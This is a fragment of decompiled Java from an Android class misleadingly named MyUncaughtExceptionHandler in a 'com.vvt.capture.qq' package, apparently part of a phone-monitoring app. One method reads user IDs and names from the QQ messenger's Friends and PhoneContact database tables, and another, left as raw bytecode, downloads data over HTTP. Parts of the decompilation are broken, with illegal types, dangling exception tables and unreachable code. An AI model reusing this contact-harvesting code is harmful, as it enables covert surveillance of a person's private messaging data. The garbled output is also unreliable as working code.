    //   106	111	147	java/lang/Exception
    //   116	120	147	java/lang/Exception
    //   125	129	147	java/lang/Exception
    //   137	144	147	java/lang/Exception
    //   10	13	175	finally
    //   22	27	213	finally
    //   43	46	213	finally
    //   53	55	213	finally
    //   57	62	213	finally
    //   65	70	213	finally
    //   72	75	213	finally
    //   82	85	213	finally
    //   87	90	213	finally
    //   94	99	213	finally
    //   101	106	213	finally
    //   106	111	218	finally
    //   116	120	218	finally
    //   125	129	218	finally
    //   137	144	218	finally
    //   150	153	230	finally
    //   10	13	244	java/lang/Exception
    //   22	27	255	java/lang/Exception
    //   43	46	255	java/lang/Exception
    //   53	55	255	java/lang/Exception
    //   57	62	255	java/lang/Exception
    //   65	70	255	java/lang/Exception
    //   72	75	255	java/lang/Exception
    //   82	85	255	java/lang/Exception
    //   87	90	255	java/lang/Exception
    //   94	99	255	java/lang/Exception
    //   101	106	255	java/lang/Exception
  }
  
  private static com.vvt.im.events.info.e c(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = false;
    String str1 = null;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = true;
    Object localObject1 = new String[bool2];
    boolean bool3 = false;
    localObject1[0] = paramString;
    Object localObject2 = "SELECT uin, name FROM Friends WHERE (uin = ?)";
    localObject1 = (d)paramSQLiteDatabase.rawQuery((String)localObject2, (String[])localObject1);
    String str2;
    if (localObject1 != null)
    {
      bool3 = ((d)localObject1).moveToFirst();
      if (bool3)
      {
        bool3 = ((d)localObject1).isAfterLast();
        if (!bool3)
        {
          int i = ((d)localObject1).getColumnIndex("uin");
          str2 = ((d)localObject1).getString(i);
          localObject2 = "name";
          i = ((d)localObject1).getColumnIndex((String)localObject2);
          String str3 = ((d)localObject1).getString(i);
          boolean bool4 = a;
          if (bool4) {}
          localObject2 = new com/vvt/im/events/info/e;
          ((com.vvt.im.events.info.e)localObject2).<init>();
          ((com.vvt.im.events.info.e)localObject2).d(str2);
          ((com.vvt.im.events.info.e)localObject2).c(str3);
        }
      }
    }
    for (;;)
    {
      if (localObject1 != null) {
        ((d)localObject1).close();
      }
      if (localObject2 == null)
      {
        localObject1 = (d)paramSQLiteDatabase.rawQuery("SELECT uin, name FROM PhoneContact", null);
        if (localObject1 != null)
        {
          bool1 = ((d)localObject1).moveToFirst();
          if (bool1)
          {
            bool1 = ((d)localObject1).isAfterLast();
            if (!bool1)
            {
              int j = ((d)localObject1).getColumnIndex("uin");
              str1 = ((d)localObject1).getString(j);
              localObject2 = "name";
              j = ((d)localObject1).getColumnIndex((String)localObject2);
              str2 = ((d)localObject1).getString(j);
              bool5 = a;
              if (bool5) {}
              localObject2 = new com/vvt/im/events/info/e;
              ((com.vvt.im.events.info.e)localObject2).<init>();
              ((com.vvt.im.events.info.e)localObject2).d(str1);
              ((com.vvt.im.events.info.e)localObject2).c(str2);
            }
          }
        }
        if (localObject1 != null) {
          ((d)localObject1).close();
        }
      }
      for (localObject1 = localObject2;; localObject1 = localObject2)
      {
        bool5 = a;
        if (bool5) {}
        return (com.vvt.im.events.info.e)localObject1;
      }
      boolean bool5 = false;
      localObject2 = null;
    }
  }
  
  /* Error */
  private static byte[] c(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: getstatic 17	com/vvt/capture/qq/MyUncaughtExceptionHandler:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: iconst_0
    //   11: newarray <illegal type>
    //   13: astore_3
    //   14: new 931	org/apache/http/impl/client/DefaultHttpClient
    //   17: astore 4
    //   19: aload 4
    //   21: invokespecial 932	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   24: new 934	org/apache/http/client/methods/HttpGet
    //   27: astore 5
    //   29: aload 5
    //   31: aload_0
    //   32: invokespecial 935	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   35: aconst_null
    //   36: astore_1
    //   37: new 937	java/io/ByteArrayOutputStream
    //   40: astore 6
    //   42: aload 6
    //   44: invokespecial 938	java/io/ByteArrayOutputStream:<init>	()V
    //   47: aload 4
    //   49: aload 5
    //   51: invokevirtual 942	org/apache/http/impl/client/DefaultHttpClient:execute	(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    //   54: astore 4
    //   56: aload 4
    //   58: invokeinterface 948 1 0
    //   63: astore 4
    //   65: aload 4
    //   67: invokeinterface 954 1 0
    //   72: astore_1
    //   73: sipush 2048
    //   76: istore 7
    //   78: iload 7
    //   80: newarray <illegal type>
    //   82: astore 4
    //   84: aload_1
    //   85: aload 4
    //   87: invokevirtual 961	java/io/InputStream:read	([B)I
    //   90: istore 8
    //   92: iconst_m1
    //   93: istore 9
    //   95: iload 8
    //   97: iload 9
    //   99: if_icmpeq +42 -> 141
    //   102: iconst_0
    //   103: istore 9
    //   105: aload 6
    //   107: aload 4
    //   109: iconst_0
    //   110: iload 8
    //   112: invokevirtual 965	java/io/ByteArrayOutputStream:write	([BII)V
    //   115: goto -31 -> 84
    //   118: astore 4
    //   120: getstatic 21	com/vvt/capture/qq/MyUncaughtExceptionHandler:removeFromPath	Z
    //   123: istore 7
    //   125: iload 7
    //   127: ifeq +3 -> 130
    //   130: aload_1
    //   131: invokestatic 968	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   134: aload 6
    //   136: invokestatic 971	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   139: aload_3
    //   140: areturn
    //   141: aload 6
    //   143: invokevirtual 974	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   146: astore_3
    //   147: aload_1
    //   148: invokestatic 968	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   151: goto -17 -> 134
    //   154: astore_3
    //   155: aload_1
    //   156: invokestatic 968	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   159: aload 6
    //   161: invokestatic 971	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   164: aload_3
    //   165: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	166	0	paramString	String
    //   1	155	1	localInputStream	java.io.InputStream
    //   5	2	2	bool1	boolean
    //   13	134	3	arrayOfByte	byte[]
    //   154	11	3	localObject1	Object
    //   17	91	4	localObject2	Object
    //   118	1	4	localException	Exception
    //   27	23	5	localHttpGet	org.apache.http.client.methods.HttpGet
    //   40	120	6	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   76	3	7	i	int
    //   123	3	7	bool2	boolean
    //   90	21	8	j	int
    //   93	11	9	k	int
    // Exception table:
    //   from	to	target	type
    //   49	54	118	java/lang/Exception
    //   56	63	118	java/lang/Exception
    //   65	72	118	java/lang/Exception
    //   78	82	118	java/lang/Exception
    //   85	90	118	java/lang/Exception
    //   110	115	118	java/lang/Exception
    //   141	146	118	java/lang/Exception
    //   49	54	154	finally
    //   56	63	154	finally
    //   65	72	154	finally
    //   78	82	154	finally
    //   85	90	154	finally
    //   110	115	154	finally
    //   120	123	154	finally
    //   141	146	154	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */